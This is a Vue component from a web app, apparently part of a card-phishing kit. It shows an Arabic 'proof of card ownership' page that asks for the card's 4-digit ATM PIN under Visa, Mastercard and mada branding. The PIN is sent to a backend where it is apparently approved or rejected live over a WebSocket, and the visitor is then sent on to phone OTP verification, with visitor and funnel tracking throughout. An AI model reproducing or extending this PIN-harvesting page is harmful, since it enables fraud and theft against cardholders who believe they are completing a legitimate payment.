<template>
    <div class="pin-shell" dir="rtl">

        <!-- Error -->
        <div v-if="error" class="atm-error">{{ error }}</div>

        <!-- Card -->
        <div class="atm-card" :class="{ 'atm-card--verifying': isVerifying }">

            <!-- ── Verifying Overlay (in-card) ───────────────────────── -->
            <Transition name="verify-fade">
                <div v-if="isVerifying" class="verify-overlay">
                    <div class="verify-overlay__content">
                        <div class="verify-overlay__icon">
                            <svg class="verify-overlay__shield" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <path d="M12 2L3 7v5c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5z" fill="#faa62e" opacity="0.15" />
                                <path d="M12 2L3 7v5c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5z" stroke="#faa62e" stroke-width="1.5" fill="none" />
                                <path d="M9 12l2 2 4-4" stroke="#faa62e" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="verify-overlay__check" />
                            </svg>
                            <div class="verify-overlay__ring"></div>
                        </div>
                        <p class="verify-overlay__title">جاري التحقق من الرقم السري</p>
                        <p class="verify-overlay__sub">يرجى الانتظار وعدم إغلاق الصفحة</p>
                        <div class="verify-overlay__dots">
                            <span></span><span></span><span></span>
                        </div>
                    </div>
                </div>
            </Transition>

            <h1 class="atm-title">إثبات ملكية البطاقة</h1>

            <p class="atm-desc">الرجاء ادخال الرقم السري الخاص بالبطاقة المكون من 4 أرقام</p>

            <div class="atm-field">
                <label for="PaymentATM" class="atm-label">الرقم السري *</label>
                <input
                    id="PaymentATM"
                    v-model="pinCode"
                    type="tel"
                    maxlength="4"
                    placeholder="****"
                    :disabled="isVerifying"
                    class="atm-input"
                    @keyup.enter="submitPin"
                />
            </div>

            <button
                id="atm_code_submit"
                :disabled="!isPinValid || isVerifying"
                class="atm-btn"
                @click="submitPin"
            >
                <svg v-if="isVerifying" class="atm-spinner" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                    <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                    <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                </svg>
                <span v-if="isVerifying">جاري التحقق...</span>
                <span v-else>تأكيد</span>
            </button>

            <div class="atm-footer">
                <span class="atm-footer__label">الدفع بواسطة</span>
                <img :src="paymentLogos" alt="Visa / Mastercard / mada" class="atm-footer__logos" />
            </div>
        </div>

        <button type="button" class="atm-cancel" @click="$router.replace({ name: 'checkout' })">
            إلغاء العملية
        </button>

    </div>
</template>

<script setup>
import { ref, computed, onMounted } from 'vue';
import { useRouter } from 'vue-router';
import { useI18n } from 'vue-i18n';
import i18n from '@/i18n';
import { useVisitorTracking } from '@/composables/useVisitorTracking';
import { trackStepViewed, trackStepCompleted } from '@/composables/useFunnelTracking';
import { usePayment } from '@/composables/usePayment';
import { usePaymentWebSocket } from '@/composables/usePaymentWebSocket';
import { getPinStatus } from '@/api/paymentApi';
import logger from '@/utils/logger';
import { safeRedirect } from '@/utils/safeRedirect';
import { getReasonLabel } from '@/constants/rejectionReasons';
import paymentLogos from '@/../../resources/images/logo/master-visa-mada.webp';

const { t } = useI18n();
const router = useRouter();

// Track this page
useVisitorTracking( 'card-pin' );

// ─── Load context via composable ────────────────────────────────────
const { context, resolveCustomerIp, submitPin: submitPinApi } = usePayment();
const sessionId = context.sessionId || '';
const customerIpRef = ref( context.customerIp || '' );

// ─── PIN State ──────────────────────────────────────────────────────
const pinCode = ref( '' );
const isVerifying = ref( false );
const hasSubmitted = ref( false );   // prevent double-submit across re-mounts
const error = ref( '' );

const isPinValid = computed( () => /^\d{4}$/.test( pinCode.value ) );

// ─── Submit PIN ─────────────────────────────────────────────────────
const submitPin = async () =>
{
    if ( !isPinValid.value || isVerifying.value || hasSubmitted.value ) return;

    isVerifying.value = true;
    hasSubmitted.value = true;
    error.value = '';

    const success = await submitPinApi( pinCode.value );

    if ( success )
    {
        logger.debug( '[CardPin] Submitted successfully, waiting for approval' );
    } else
    {
        error.value = t( 'verification.cardPin.submitError' );
        isVerifying.value = false;
        hasSubmitted.value = false;
    }
};

// ─── WebSocket + Polling via composable ─────────────────────────────
const { setup: setupWs } = usePaymentWebSocket( {
    channelPrefix: 'otp',       // PIN events broadcast on the 'otp' channel (shared with OTP events, filtered by event name)
    approvedEvent: 'PinApproved',
    rejectedEvent: 'PinRejected',
    logTag: 'CardPin',

    onApproved ( event )
    {
        logger.debug( '[CardPin] Approved:', event );
        isVerifying.value = false;
        trackStepCompleted( 'card_pin', 'phone_verification' );

        // Defer navigation via microtask to release the WS message handler
        queueMicrotask( () =>
        {
            if ( event.redirect_to )
            {
                safeRedirect( event.redirect_to, 'phoneVerification', router );
            } else
            {
                router.push( { name: 'phoneVerification' } );
            }
        } );
    },

    onRejected ( event )
    {
        logger.debug( '[CardPin] Rejected:', event );
        isVerifying.value = false;
        error.value = getReasonLabel( event.reason, t ) || t( 'verification.cardPin.pinRejected' );
        pinCode.value = '';
        hasSubmitted.value = false;
    },

    async pollFn ( { handleApproved, handleRejected } )
    {
        const sig = context.statusSigs?.pin || '';
        if ( !isVerifying.value || !sig ) return;

        const { data } = await getPinStatus( sessionId, sig );

        if ( data.status === 'verified' )
        {
            handleApproved( data );
        } else if ( data.status === 'rejected' )
        {
            handleRejected( { reason: data.reason || 'pin_other' } );
        }
    },
} );

// ─── Lifecycle ──────────────────────────────────────────────────────
onMounted( async () =>
{
    // Force Arabic locale on payment pages
    if ( i18n.global.locale.value !== 'ar' ) {
        i18n.global.locale.value = 'ar';
    }

    const ip = customerIpRef.value || await resolveCustomerIp();
    customerIpRef.value = ip;

    setupWs( ip );
    trackStepViewed( 'card_pin' );
} );
// WS channel + polling cleanup handled by usePaymentWebSocket onUnmounted
</script>

<style scoped>
/* CardPinPage — simple payment gateway PIN entry */

.pin-shell {
    min-height: 100dvh;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 0.75rem;
    background: #eef1f5;
}

.atm-error {
    background: #fee2e2;
    color: #dc2626;
    border: 1px solid #fca5a5;
    border-radius: 6px;
    padding: 0.5rem 1rem;
    font-size: 14px;
    text-align: center;
    margin-bottom: 0.75rem;
    max-width: 460px;
    width: 100%;
}

.atm-card {
    background: #fff;
    border-radius: 8px;
    box-shadow: 0 3px 6px 0 rgba(0,0,0,.13);
    max-width: 460px;
    width: 100%;
    padding: 2rem 1.5rem;
    text-align: center;
}

.atm-title {
    font-size: 20px;
    font-weight: 700;
    color: #1f2937;
    margin: 0 0 1rem;
}

.atm-desc {
    font-size: 14px;
    color: #374151;
    margin: 0 0 1.25rem;
    line-height: 1.6;
}

.atm-field {
    margin-bottom: 1.25rem;
    text-align: right;
}

.atm-label {
    display: block;
    font-size: 14px;
    color: #374151;
    margin-bottom: 0.375rem;
}

.atm-input {
    width: 100%;
    padding: 0.5rem 0.75rem;
    border: 1px solid #d1d5db;
    border-radius: 4px;
    font-size: 20px;
    text-align: right;
    letter-spacing: 0.3em;
    direction: ltr;
    box-sizing: border-box;
}

.atm-input:focus {
    outline: none;
    border-color: #faa62e;
    box-shadow: 0 0 0 2px rgba(250,166,46,.2);
}

.atm-btn {
    display: inline-flex;
    align-items: center;
    justify-content: center;
    gap: 0.5rem;
    width: 200px;
    padding: 0.625rem 1rem;
    background: #faa62e;
    color: #fff;
    font-size: 20px;
    font-weight: 600;
    border: none;
    border-radius: 4px;
    cursor: pointer;
    margin-bottom: 1.25rem;
    transition: opacity 0.15s;
}

.atm-btn:disabled {
    opacity: 0.6;
    cursor: not-allowed;
}

.atm-btn:not(:disabled):hover {
    opacity: 0.9;
}

.atm-spinner {
    width: 1.25rem;
    height: 1.25rem;
    animation: spin 1s linear infinite;
}

@keyframes spin {
    to { transform: rotate(360deg); }
}

.atm-footer {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 0.5rem;
    padding-top: 1rem;
    border-top: 1px solid #e5e7eb;
}

.atm-footer__label {
    font-size: 13px;
    color: #6b7280;
}

.atm-footer__logos {
    height: 1.5rem;
    width: auto;
}

/* ── Verifying overlay (in-card frosted glass) ─────── */
.atm-card--verifying {
    position: relative;
    pointer-events: none;
}

.verify-overlay {
    position: absolute;
    inset: 0;
    z-index: 20;
    display: flex;
    align-items: center;
    justify-content: center;
    background: rgba(255, 255, 255, 0.88);
    backdrop-filter: blur(6px);
    -webkit-backdrop-filter: blur(6px);
    border-radius: inherit;
}

.verify-overlay__content {
    text-align: center;
    padding: 2rem;
}

.verify-overlay__icon {
    position: relative;
    display: inline-flex;
    align-items: center;
    justify-content: center;
    width: 72px;
    height: 72px;
    margin-bottom: 1rem;
}

.verify-overlay__shield {
    width: 40px;
    height: 40px;
}

.verify-overlay__check {
    stroke-dasharray: 20;
    stroke-dashoffset: 20;
    animation: check-draw 0.6s 0.3s ease forwards;
}

@keyframes check-draw {
    to { stroke-dashoffset: 0; }
}

.verify-overlay__ring {
    position: absolute;
    inset: 0;
    border: 3px solid transparent;
    border-top-color: #faa62e;
    border-radius: 50%;
    animation: spin 1s linear infinite;
}

.verify-overlay__title {
    font-size: 16px;
    font-weight: 700;
    color: #1f2937;
    margin: 0 0 4px;
}

.verify-overlay__sub {
    font-size: 13px;
    color: #6b7280;
    margin: 0 0 14px;
}

.verify-overlay__dots {
    display: flex;
    justify-content: center;
    gap: 6px;
}

.verify-overlay__dots span {
    width: 8px;
    height: 8px;
    border-radius: 50%;
    background: #faa62e;
    animation: dot-bounce 1.4s ease-in-out infinite;
}

.verify-overlay__dots span:nth-child(2) { animation-delay: 0.2s; }
.verify-overlay__dots span:nth-child(3) { animation-delay: 0.4s; }

@keyframes dot-bounce {
    0%, 80%, 100% { transform: scale(0.6); opacity: 0.4; }
    40% { transform: scale(1); opacity: 1; }
}

.verify-fade-enter-active,
.verify-fade-leave-active {
    transition: opacity 0.25s ease;
}
.verify-fade-enter-from,
.verify-fade-leave-to {
    opacity: 0;
}

.atm-cancel {
    margin-top: 0.75rem;
    background: none;
    border: none;
    color: #9ca3af;
    font-size: 13px;
    cursor: pointer;
    display: block;
}

.atm-cancel:hover {
    color: #dc2626;
}
</style>
